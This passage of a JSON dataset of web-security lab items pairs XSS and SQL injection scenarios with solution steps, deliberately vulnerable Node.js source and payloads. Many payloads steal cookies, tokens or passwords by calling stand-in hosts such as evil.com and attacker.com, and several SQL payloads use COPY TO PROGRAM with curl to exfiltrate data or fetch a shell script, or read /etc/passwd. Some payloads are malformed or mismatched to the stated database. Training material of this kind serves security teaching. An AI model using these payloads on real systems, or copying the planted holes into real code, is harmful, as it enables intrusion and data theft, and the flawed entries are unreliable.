      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-profile', (req, res) => {\n  const bio = req.body.bio;\n  const formatted = `<p>${bio}</p>`;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [formatted, req.user.id]);\n  res.redirect('/dashboard');\n});",
      "payloads": [
        "<script>fetch('http://evil.com?c='+document.cookie)</script>",
        "<img src=x onerror=alert('CMS')>"
      ]
    },
    {
      "Lab scenario": "Reflected XSS via HTTP header manipulation",
      "Lab Description": "This lab contains a reflected XSS vulnerability in an HTTP response header. The application echoes back user-supplied data without encoding it properly. To solve: Inject a JavaScript payload in a request header and execute an alert().",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept a GET request using Burp Suite.",
        "2. Modify the User-Agent header to include: \"<script>alert('XSS')</script>\".",
        "3. Observe script execution in the server response.",
        "4. Identify additional injection points for privilege escalation.",
        "5. Bypass security filters using event-based XSS techniques."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/profile', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  res.setHeader('X-Debug-Info', userAgent);\n  res.send(`<html><body><h1>Welcome!</h1></body></html>`);\n});",
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('Header')>"
      ]
    },
    {
      "Lab scenario": "Mutation XSS via DOM property injection",
      "Lab Description": "This lab demonstrates a mutation-based XSS vulnerability. The application modifies DOM properties dynamically based on user input. To solve: Inject an XSS payload that mutates into an executable script after DOM manipulation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Locate a dynamic element on the page using DevTools.",
        "2. Inject a payload like: \"javascript:alert(1)\" into an editable field.",
        "3. Observe how the application mutates input into an event handler.",
        "4. Confirm successful execution after mutation.",
        "5. Extend the attack to steal authentication tokens."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const input = document.querySelector('#user-input');\nconst preview = document.querySelector('#preview');\n\ninput.addEventListener('input', e => {\n  const val = e.target.value;\n  preview.innerHTML = `<a href='${val}'>Click</a>`;\n});",
      "payloads": [
        "javascript:alert(1)",
        "\" onmouseover=alert('XSS') x=\""
      ]
    },
    {
      "Lab scenario": "Stored XSS via SVG file upload",
      "Lab Description": "This lab contains a stored XSS vulnerability via an SVG file upload feature. The application fails to sanitize embedded JavaScript inside SVG images. To solve: Upload a malicious SVG file containing an XSS payload and trigger script execution when an administrator views it.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Create a malicious SVG file containing <script>alert(1)</script>.",
        "2. Upload the file to the application using the file manager.",
        "3. Wait for an administrator to open the file.",
        "4. Observe JavaScript execution in their session.",
        "5. Exploit the vulnerability to steal session tokens."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  const file = req.files.svg;\n  file.mv(`./uploads/${file.name}`, err => {\n    if (err) return res.status(500).send('Upload failed');\n    res.send('File uploaded successfully');\n  });\n});",
      "payloads": [
        "<svg><script>alert(1)</script></svg>",
        "<script>alert('SVGXSS')</script>"
      ]
    },
    {
      "Lab scenario": "DOM XSS via dynamically generated iframe src attribute",
      "Lab Description": "This lab contains a DOM-based XSS vulnerability in an iframe source attribute assignment. The application sets the iframe src dynamically based on user input without sanitization. To solve: Inject an XSS payload in the URL parameter to execute JavaScript inside the iframe.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Access the vulnerable endpoint with a crafted URL.",
        "2. Inject the payload: javascript:alert(document.domain)",
        "3. Observe the iframe loading the JavaScript payload.",
        "4. Extend the attack to exfiltrate sensitive data.",
        "5. Implement a bypass using encoded URI schemes."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/iframe', (req, res) => {\n  const page = req.query.page;\n  res.send(`<!DOCTYPE html><html><body><iframe id='iframe'></iframe><script>document.getElementById('iframe').src = \"${page}\";</script></body></html>`);\n});",
      "payloads": [
        "javascript:alert(document.domain)",
        "\" onload=alert('Iframe') x=\""
      ]
    },
    {
      "Lab scenario": "Stored XSS in comment section with Markdown processing",
      "Lab Description": "This lab contains a stored XSS vulnerability due to improper sanitization in a Markdown-based comment system. The application incorrectly allows JavaScript execution within user-submitted comments. To solve: Submit a crafted Markdown payload that executes JavaScript when rendered.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Register an account and navigate to the comment section.",
        "2. Post the payload: [Click me](javascript:alert(1))",
        "3. Reload the page and observe JavaScript execution.",
        "4. Exploit the vulnerability to steal authentication tokens.",
        "5. Implement a payload that persists across multiple views."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query('INSERT INTO comments (content) VALUES (?)', [comment]);\n  res.redirect('/post');\n});",
      "payloads": [
        "[Click me](javascript:alert(1))",
        "<script>alert('MDXSS')</script>"
      ]
    },
    {
      "Lab scenario": "Reflected XSS via vulnerable JSON endpoint",
      "Lab Description": "This lab contains a reflected XSS vulnerability in a JSON API response. The application returns user input directly in the response without encoding. To solve: Inject an XSS payload in a query parameter and execute JavaScript when parsing the JSON response.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Send a request with an XSS payload via a query parameter.",
        "2. Inject: \"<script>alert(1)</script>\" into the 'name' parameter.",
        "3. Observe JavaScript execution in the browser console.",
        "4. Escalate the attack by chaining multiple payloads.",
        "5. Exfiltrate session cookies using an obfuscated payload."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/user', (req, res) => {\n  const name = req.query.name;\n  res.json({ message: `Hello, ${name}` });\n});",
      "payloads": [
        "<script>alert(1)</script>",
        "\" onload=alert('JSONXSS') x=\""
      ]
    },
    {
      "Lab scenario": "Mutation XSS via attribute-based event handler injection",
      "Lab Description": "This lab demonstrates a mutation-based XSS vulnerability where user input is inserted into an attribute, mutating into an event handler. The application improperly handles attribute-based user input, allowing execution of JavaScript. To solve: Inject an XSS payload that mutates and executes JavaScript after DOM modification.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Identify a form input field that dynamically updates an element's attribute.",
        "2. Inject payload: \"onmouseover=alert(1)\" into the input field.",
        "3. Observe how the application mutates input into an event handler.",
        "4. Trigger the payload by interacting with the element.",
        "5. Bypass filters using encoded attribute payloads."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const userInput = req.query.hover || '';\nres.send(`<div title='${userInput}'>Hover here</div>`);",
      "payloads": [
        "onmouseover=alert(1)",
        "<svg onload=alert('AttributeXSS')>"
      ]
    },
    {
      "Lab scenario": "Stored XSS via JSON Web Token (JWT) payload",
      "Lab Description": "This lab contains a stored XSS vulnerability where an attacker can inject malicious JavaScript into a JWT payload. The application decodes and reflects the JWT payload in an admin dashboard without proper sanitization. To solve: Modify the JWT payload to include a stored XSS attack.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Capture and decode a JWT token using jwt.io.",
        "2. Modify the 'username' field to: \"<script>alert(1)</script>\".",
        "3. Re-sign the JWT using a weak secret key.",
        "4. Send the modified JWT to the application.",
        "5. Observe JavaScript execution in the admin dashboard."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const decoded = jwt.verify(req.body.token, 'weaksecret');\n  res.send(`<h1>Welcome ${decoded.username}</h1>`);\n});",
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('JWTXSS')>"
      ]
    },
    {
      "Lab scenario": "Stored XSS in user profile bio field",
      "Lab Description": "This lab contains a stored XSS vulnerability in the user profile bio field. The application allows users to enter bio descriptions, which are displayed on their profile pages without proper sanitization. To solve: Inject a malicious script that executes whenever another user views the profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Register a user account and navigate to the profile update section.",
        "2. Enter the payload <script>alert('XSS')</script> in the bio field.",
        "3. Save changes and log out.",
        "4. Log in as another user and visit the attacker’s profile.",
        "5. Observe the XSS execution."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  console.log('Updating bio with:', bio);\n  res.send(`<p>${bio}</p>`);\n});",
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('Profile')>"
      ]
    },
    {
      "Lab scenario": "DOM-based XSS in dynamic comment rendering",
      "Lab Description": "This lab contains a DOM-based XSS vulnerability in a comment rendering feature. The application updates comments dynamically in the DOM using innerHTML without proper sanitization. To solve: Inject JavaScript code that executes in another user's browser when they load comments.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Post a comment containing the payload: <img src=x onerror=alert('XSS')>",
        "2. Refresh the page and observe script execution.",
        "3. Test additional payloads for event-based execution.",
        "4. Verify if the attack works across multiple users.",
        "5. Develop a more sophisticated payload to exfiltrate session cookies."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/comments', (req, res) => {\n  const comment = req.query.comment || '';\n  console.log('Rendering comment:', comment);\n  res.send(`<div id='comments'><p>${comment}</p></div>`);\n});",
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('CommentXSS')>"
      ]
    },
    {
      "Lab scenario": "Mutation-based XSS via event handlers in chat application",
      "Lab Description": "This lab contains a mutation-based XSS vulnerability where user-generated content is manipulated by client-side scripts. The application modifies chat messages, allowing attackers to inject event-based malicious scripts. To solve: Exploit DOM mutation to inject an XSS payload.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Send a crafted message containing <a href='#' onclick='alert(1)'>Click me</a>.",
        "2. Observe how the message is processed by the application.",
        "3. Modify the payload to include additional event handlers like onmouseover.",
        "4. Trigger execution upon DOM modification.",
        "5. Verify persistence and payload execution on multiple users."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/chat', (req, res) => {\n  const msg = req.query.msg || '';\n  console.log('Received message:', msg);\n  res.send(`<div id='chatbox'><div>${msg}</div></div>`);\n});",
      "payloads": [
        "<a href='#' onclick='alert(1)'>Click me</a>",
        "<img src=x onerror=alert('ChatXSS')>"
      ]
    },
    {
      "Lab scenario": "Reflected XSS in search query results",
      "Lab Description": "This lab contains a reflected XSS vulnerability in the search functionality. The application dynamically displays user input without proper encoding. To solve: Craft a malicious search query that triggers JavaScript execution in the user's browser.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "1. Enter <script>alert('XSS')</script> in the search bar.",
        "2. Click the search button.",
        "3. Observe script execution in the response.",
        "4. Experiment with different payloads for bypassing security mechanisms.",
        "5. Implement URL encoding techniques for deeper exploitation."
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const query = req.query.q || '';\n  console.log('Search query:', query);\n  res.send(`<h2>Results for: ${query}</h2>`);\n});",
      "payloads": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('Search')>"
      ]
    },
    {
      "Lab scenario": "XSS via WebSocket message injection",
      "Lab Description": "This lab contains an XSS vulnerability in a WebSocket-based messaging system. The application broadcasts user messages to all connected clients without validation. To solve: Inject a malicious payload into the WebSocket message stream to trigger execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Open the WebSocket connection and send malicious payload",
        "2. Observe execution in all connected clients",
        "3. Exploit cookie stealing"
      ],
      "payloads": [
        "<img src=x onerror='fetch(\"https://attacker.com?c=\"+document.cookie)'>",
        "<script>new Image().src='http://hacker.com/?leak='+btoa(document.cookie)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 3000 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (data) => {\n    wss.clients.forEach(client => {\n      client.send(`<div>${data}</div>`); // Vulnerable code\n    });\n  });\n});"
    },
    {
      "Lab scenario": "Stored XSS in product review section",
      "Lab Description": "This lab contains a stored XSS vulnerability in the product review section. The application allows users to submit reviews, which are displayed on product pages without proper sanitization. To solve: Inject a malicious script that executes whenever another user views the product review.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Submit review with XSS payload",
        "2. Refresh page to trigger execution",
        "3. Exploit session hijacking"
      ],
      "payloads": [
        "<iframe src='javascript:alert(parent.document.cookie)'>",
        "<svg onload='fetch(\"https://evil.com/collect?data=\"+localStorage.getItem(\"token\"))'>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/reviews', (req, res) => {\n  const review = req.body.content;\n  // Vulnerable database insertion\n  db.run(`INSERT INTO reviews VALUES ('${review}')`);\n  res.redirect('/product');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in real-time notifications",
      "Lab Description": "This lab contains a DOM-based XSS vulnerability in the real-time notifications feature. Notifications are inserted into the DOM dynamically using innerHTML without proper sanitization. To solve: Inject a script that executes when another user receives a notification.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Craft malicious notification message",
        "2. Trigger DOM manipulation",
        "3. Capture user credentials"
      ],
      "payloads": [
        "<img src='x' onerror='window.location=\"https://phishing.com?cookie=\"+document.cookie'>",
        "<video><source onerror='new Audio().src=\"http://attacker.com/\"+document.domain'>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/notify', (req, res) => {\n  const msg = req.query.alert;\n  res.send(`\n    <script>\n      // Vulnerable DOM manipulation\n      document.getElementById('alerts').innerHTML = \n        decodeURIComponent('${encodeURIComponent(msg)}');\n    </script>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in feedback form submission",
      "Lab Description": "This lab contains a reflected XSS vulnerability in the feedback submission form. The application includes user input in the response page without proper encoding. To solve: Inject a script that executes when the form submission result is displayed.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "1. Submit feedback with XSS payload",
        "2. Direct victim to crafted URL",
        "3. Perform session fixation"
      ],
      "payloads": [
        "javascript:eval(atob('YWxlcnQoJ1hTUyB0cmlnZ2VyZWQhJyk='))",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/feedback', (req, res) => {\n  const input = req.query.comment;\n  // Vulnerable reflection\n  res.send(`<h3>Your feedback: ${input}</h3>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via manipulated URL parameters in image preview",
      "Lab Description": "This lab contains an XSS vulnerability in an image preview feature where the image URL is taken directly from a URL parameter and displayed without sanitization. To solve: Inject a payload that triggers JavaScript execution when an image is loaded.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Craft malicious image URL",
        "2. Lure victim to open link",
        "3. Perform CSRF attack"
      ],
      "payloads": [
        "javascript:document.write('<script src=\"https://evil.com/stealer.js\"></script>')",
        "data:image/png;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview', (req, res) => {\n  const url = req.query.image;\n  // Vulnerable image rendering\n  res.send(`<img src=\"${url}\" alt=\"Preview\">`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via injected script in WebSocket chat application",
      "Lab Description": "This lab contains an XSS vulnerability in a WebSocket-based chat application where user messages are broadcast to all connected clients without validation. To solve: Inject a malicious script that executes when another user receives the message.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Send malicious chat message",
        "2. Bypass content security policies",
        "3. Perform keystroke logging"
      ],
      "payloads": [
        "<script>navigator.credentials.get({password:true}).then(c => fetch('https://attacker.com?p='+c.password));</script>",
        "<iframe srcdoc='<script>parent.postMessage(document.cookie,\"*\")</script>'>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const WebSocket = require('ws');\\nconst wss = new WebSocket.Server({ port: 8080 });\\n\\nwss.on('connection', (ws) => {\\n  ws.on('message', (msg) => {\\n    // Vulnerable broadcast\\n    wss.clients.forEach(client => {\\n      client.send(`<div class='message'>${msg}</div>`);\\n    });\\n  });\\n});"
    }
    ,

     
  {
    "Lab scenario": "Banking Portal SQL injection in ORDER BY Clause via UNION Attack",
    "Lab Description": "The transaction sorting feature in a banking portal directly concatenates user input into ORDER BY clauses. The application leaks database errors through verbose logging. To solve: Extract account balances using UNION-based injection while bypassing column type restrictions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept sorting request with Burp Suite",
      "Determine column count using ORDER BY 4-- payloads",
      "Bypass type checks with CAST(): ' UNION SELECT CAST(balance AS TEXT),2,3,4 FROM accounts--",
      "Identify numeric columns through error analysis",
      "Exfiltrate full transaction history using hex encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pool = require('./db').pool;\n\napp.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`FULL QUERY: ${query}\\nERROR: ${err.stack}`); // Error leakage\n      res.status(500).send('Payment system error');\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "CASE WHEN (1=1) THEN amount ELSE date END--",
      "' UNION SELECT CAST(balance AS TEXT),2,3 FROM accounts--",
      "' AND 1=CAST((SELECT current_database()) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based Blind SQLi in HAVING Clause",
    "Lab Description": "An IoT device management dashboard filters sensor data using vulnerable HAVING conditions. No direct output is shown, but HTTP 200/500 status codes indicate query truthiness. To solve: Determine admin API key through binary search of character space.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz HAVING parameter",
      "Identify boolean trigger: ' HAVING 1=1 -- vs 1=0",
      "Automate with sqlmap: sqlmap -u '...' --technique=B --level=5",
      "Brute-force API key using substring binary search",
      "Validate key through device control API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-aggregate', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.query(query, (err, result) => {\n    if(err) return res.status(500).send();\n    res.status(200).json({count: result.rowCount});\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT SUBSTR(apikey,1,1) FROM admins)='a'",
      "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='devices')",
      "(SELECT LENGTH(apikey) FROM admins)=32 AND 1=1"
    ]
  },
  {
    "Lab scenario": "CMS User Search Time-Based Injection via GraphQL",
    "Lab Description": "A headless CMS exposes GraphQL endpoint with vulnerable user search. Responses show identical success/failure states. To solve: Exfiltrate password hashes through conditional response delays using DNS over HTTP.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL query with Postman",
      "Identify injectable field using pg_sleep(5) payloads",
      "Set up collaborator server for OOB exfiltration",
      "Craft time-based payload with CASE statements",
      "Correlate response times with character values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    users(_, { search }) {\n      return db.query(`SELECT * FROM users WHERE ${search}`);\n    }\n  }\n};",
    "payloads": [
      "1=1; SELECT CASE WHEN (SUBSTR(hash,1,1)='a') THEN pg_sleep(5) ELSE 0 END FROM passwords",
      "1=1 AND (SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT hash)))"
    ]
  },
  {
    "Lab scenario": "REST API Gateway UNION Injection Through JSON Parameter",
    "Lab Description": "An inventory management API processes JSON payloads without type validation. The /search endpoint concatenates JSON array values directly into SELECT. To solve: Dump user credentials through type juggling attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Identify JSON array injection point: {\"filters\":[\"1=1\"]}",
      "Bypass WAF using Unicode escapes: \\u0027 UNION...",
      "Extract schema via json_agg() function",
      "Convert results to base64 for exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  //...\n});",
    "payloads": [
      "1=1] UNION SELECT null,version(),null--",
      "\" OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns--"
    ]
  },
  {
    "Lab scenario": "Payment Processor Error-Based Injection in GROUP BY",
    "Lab Description": "A payment analytics dashboard leaks PostgreSQL errors through misconfigured grouping. To solve: Extract PCI-compliant credit card numbers using verbose error messages with CTE injections.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Trigger error with invalid GROUP BY clause",
      "Extract version info from error message",
      "Use CTE to stack queries: ; WITH ...",
      "Cast sensitive data to incompatible types",
      "Bypass PCI logging through error channels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT ${group} FROM payments GROUP BY ${group}`;\n  //...\n});",
    "payloads": [
      "(SELECT 1/0 FROM credit_cards LIMIT 1)",
      "GROUP BY (CAST((SELECT pan FROM cards) AS INTEGER))"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Second-Order SQLi in User Registration",
    "Lab Description": "Patient registration form stores unsanitized input later used in batch reports. To solve: Trigger delayed injection during nightly report generation using temp table pollution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register patient with time-based payload",
      "Monitor scheduled tasks with Burp Collaborator",
      "Create temp table with credential data",
      "Set up trigger-based exfiltration",
      "Harvest data from scheduled report outputs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const note = req.body.medical_notes;\n  db.query(`INSERT INTO patients (notes) VALUES ('${note}')`);\n});",
    "payloads": [
      "'); CREATE TEMP TABLE exfil AS SELECT * FROM staff--",
      "'); COPY (SELECT * FROM diagnoses) TO PROGRAM 'curl https://attacker.com/?exfil=$(data)'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform JSON Array Injection in WHERE Clause",
    "Lab Description": "Product search feature parses JSON arrays directly into SQL conditions. To solve: Bypass parameterized queries through JSON nesting and type confusion attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Convert normal request to JSON array format",
      "Escape array context using nested objects",
      "Chain multiple injections with boolean logic",
      "Bypass prepared statements via type juggling",
      "Combine with XSS for stored exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/products', (req, res) => {\n  const filters = JSON.parse(req.body);\n  const conditions = filters.map(f => `${f.field}=${f.value}`).join(' AND ');\n  const query = `SELECT * FROM products WHERE ${conditions}`;\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT 1,version()--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1\"}]"
    ]
  },
  {
    "Lab scenario": "Inventory Management UNION Injection with Column Padding",
    "Lab Description": "Legacy inventory system uses fixed column counts in UNION queries. To solve: Bypass column count validation through NULL padding and type coercion.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Determine base column count using ORDER BY",
      "Bypass UNION restrictions with ALL SELECT",
      "Use NULL and type casts to match columns",
      "Extract system files using COPY TO",
      "Decode base64 results in HTTP responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/items', (req, res) => {\n  const category = req.query.cat;\n  const query = `SELECT id, name FROM items WHERE category='${category}'`;\n});",
    "payloads": [
      "' UNION ALL SELECT CAST(id AS TEXT), password FROM users--",
      "' UNION SELECT NULL, LOAD_EXTENSION('evil.dll')--"
    ]
  },
  {
    "Lab scenario": "CRM System Blind Injection via WebSocket Messages",
    "Lab Description": "Real-time contact search uses WebSockets with no input validation. To solve: Perform blind boolean injection through response message ordering.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp",
      "Craft binary WebSocket frames with injection payloads",
      "Measure response timing using sequence analysis",
      "Use bit-shifting to optimize character extraction",
      "Reconstruct session tokens through statistical analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "ws.on('message', (query) => {\n  db.query(`SELECT * FROM contacts WHERE ${query}`, (err, res) => {\n    ws.send(JSON.stringify(res));\n  });\n});",
    "payloads": [
      "1=1; SELECT CASE WHEN (ASCII(SUBSTR(token,1,1))>100 THEN pg_sleep(2) END FROM sessions",
      "1=1 AND (SELECT COUNT(*) FROM users WHERE permissions=0xdeadbeef)=1"
    ]
  },
  {
    "Lab scenario": "Learning Management System Polyglot Injection in CSV Export",
    "Lab Description": "Grade export feature vulnerable to injection through CSV formula fields. To solve: Execute operating system commands through SQL injection with PostgreSQL large object imports.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger CSV export with malicious formula",
      "Bypass CSV escaping through UTF-7 encoding",
      "Use PostgreSQL lo_import to read server files",
      "Combine with COPY FROM PROGRAM for RCE",
      "Clean attack artifacts through vacuum operations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM grades WHERE ${filter}) TO STDOUT CSV`;\n});",
    "payloads": [
      "1=1); COPY grades FROM PROGRAM 'curl https://attacker.com/shell.sh'--",
      "1=1 UNION SELECT LO_IMPORT('/etc/passwd')::text"
    ]
  },
  {
    "Lab scenario": "REST API Boolean-Based Blind SQLi in Login",
    "Lab Description": "A REST API login endpoint uses dynamic SQL without sanitization. No error messages are returned, but a JWT token is issued on success. To solve: Perform boolean-based blind SQLi to extract the admin password character-by-character.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send POST /api/login requests",
      "Test boolean conditions: admin' AND 1=1-- vs 1=0",
      "Automate with sqlmap: sqlmap -r request.txt --technique=B --dbms=SQLite",
      "Brute-force password using SUBSTR and binary search",
      "Submit extracted password to obtain JWT token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/login', (req, res) => {\n  const { user, pass } = req.body;\n  const query = `SELECT * FROM users WHERE username='${user}' AND password='${pass}'`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 401).json(row ? { token: '...' } : {});\n  });\n});",
    "payloads": [
      "admin' AND SUBSTR(password,1,1)='a'--",
      "admin' AND (SELECT LENGTH(password) FROM users)=32--",
      "admin' AND (SELECT hex(password) LIKE '25%')--"
    ]
  },
  {
    "Lab scenario": "GraphQL Union-Based SQLi in IoT Device Query",
    "Lab Description": "A GraphQL resolver for IoT devices concatenates user input into a SQL query. Results are returned as JSON. To solve: Use UNION injection to retrieve device API keys from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft GraphQL query with malicious deviceId parameter",
      "Inject: deviceId: \"123' UNION SELECT 1, api_key FROM devices--\"",
      "Verify API keys appear in JSON response",
      "Refine payload to extract specific credentials",
      "Use extracted keys to access device controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    device: (_, { id }) => {\n      const query = `SELECT id, status FROM devices WHERE id='${id}'`;\n      return db.get(query);\n    }\n  }\n};",
    "payloads": [
      "123' UNION SELECT id, api_key FROM devices--",
      "456' UNION SELECT 1, sqlite_version()--",
      "789' UNION SELECT NULL, group_concat(api_key) FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi with Boolean Inference",
    "Lab Description": "A CMS logs HTTP headers into a SQL database. A log preview feature reflects entries matching boolean conditions. To solve: Extract admin email via boolean-based blind SQLi in the X-Search-Token header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Search-Token",
      "Test: 'xyz' AND (SELECT 1 FROM users WHERE role='admin')=1--",
      "Check log preview for presence/absence of entry",
      "Automate with Python to infer email characters",
      "Extract full email via SUBSTR and binary search"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const token = req.headers['x-search-token'];\n  db.run(`INSERT INTO logs (entry) VALUES ('${token}')`);\n  res.send('Search logged');\n});",
    "payloads": [
      "test' AND (SELECT LENGTH(email) FROM users WHERE role='admin')=20--",
      "test' AND (SELECT hex(substr(email,1,1)) FROM users)='61'--",
      "test' AND (SELECT COUNT(*) FROM sqlite_master)=5--"
    ]
  },
  {
    "Lab scenario": "SOAP API Time-Based SQLi with XML Input",
    "Lab Description": "A SOAP login service uses XML input in dynamic SQL. Responses lack feedback, but delays indicate query truthiness. To solve: Extract admin password via time-based delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send XML payloads with time-delay conditions",
      "Use payload: ' OR CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(100000000) ELSE 0 END--",
      "Measure response times with Burp Suite's Repeater",
      "Automate extraction with Python requests and timing",
      "Reconstruct password from observed delays"
    ],
    "Vulnerability name": "SQL injection",
